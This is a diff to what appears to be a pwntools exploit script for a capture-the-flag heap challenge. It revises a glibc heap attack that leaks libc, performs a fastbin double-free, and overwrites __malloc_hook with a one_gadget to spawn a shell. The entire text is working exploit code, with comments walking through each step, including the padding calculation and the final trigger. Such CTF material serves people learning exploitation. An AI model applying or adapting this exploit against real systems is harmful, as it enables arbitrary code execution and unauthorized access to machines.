@@ -59,7 +59,7 @@ io = start()
 # 1. leak libc
 malloc(0x80) # idx 0
 malloc(0x20) # idx 1
-free(0)
+free(0) # puts idx 0 into unsortedbind
 libc_leak = view(0).rstrip(b"[")
 libc_leak = u64(libc_leak.ljust(8, b"\x00"))
 log.info("libc leak: %s" % hex(libc_leak))
@@ -73,36 +73,29 @@ one_gadget = libc_base + one_offset
 malloc_hook = libc_base + malloc_hook_offset
 
 # 2. fastbin dup
-malloc(0x48) # Old chunk, idx 2
-malloc(0x48) # A idx 3
-malloc(0x48) # B idx 4
+
+malloc(0x80) # Old chunk, idx 2. Requested from unsortedbin
+malloc(0x68) # A idx 3
+malloc(0x68) # B idx 4
 
 free(3) # A idx 3 : A linked into fastbin
 free(4) # B idx 4 : B linked into fastbin
 free(3) # A idx 3 : A linked into fastbin again
 
-malloc(0x48) # Reallocate A, idx 5
-write(p64(0x61), 5) # Write a fake size field into the main arena
-malloc(0x48) # Reallocate B, idx 6
-malloc(0x48) # Reallocate A, idx 7 : Now we have malloc_hook-35 at head of fastbins
+malloc(0x68) # 5
+write(p64(malloc_hook-35), 5)
+malloc(0x68) # 6
+malloc(0x68) # 7 Put malloc_hook-35 into fastbin 0x70
 
-malloc(0x58) # 8
-malloc(0x58) # 9
+malloc(0x68) # 8 Request 0x70 chunk starting from malloc_hook-35
 
-free(8)
-free(9)
-free(8)
+# Padding is 19 because 16 metadata + 19 padding = 35
+write(b"A"*19 + p64(one_gadget),8) # Overwrite malloc_hook with one gadget
 
-malloc(0x58) # 10
-write(p64(malloc_hook+40),10)
-malloc(0x58) # 11
-malloc(0x58) # 12
-
-malloc(0x58) # 13 request the chunk with fake size field
-write(p64(0)*6 + p64(malloc_hook-35), 13) # overwrite top chunk with malloc_hook-35
-
-malloc(0x28) # 14, Will be serviced by smallbins 0x40
-malloc(0x28) # 15, will be serviced by top chunk which is at malloc_hook-35
-write(b"A"*19 + p64(one_gadget), 15)
+# Request final chunk manually because our malloc() has recvline(b">") at the end
+# and this will wait indefinetely because system(/bin/sh) is called
+io.sendline(b"1")
+io.sendlineafter(b"idx:", b"9") # idx 9
+io.sendlineafter(b"size:", b"0x1") # random size, not important
 
 io.interactive()
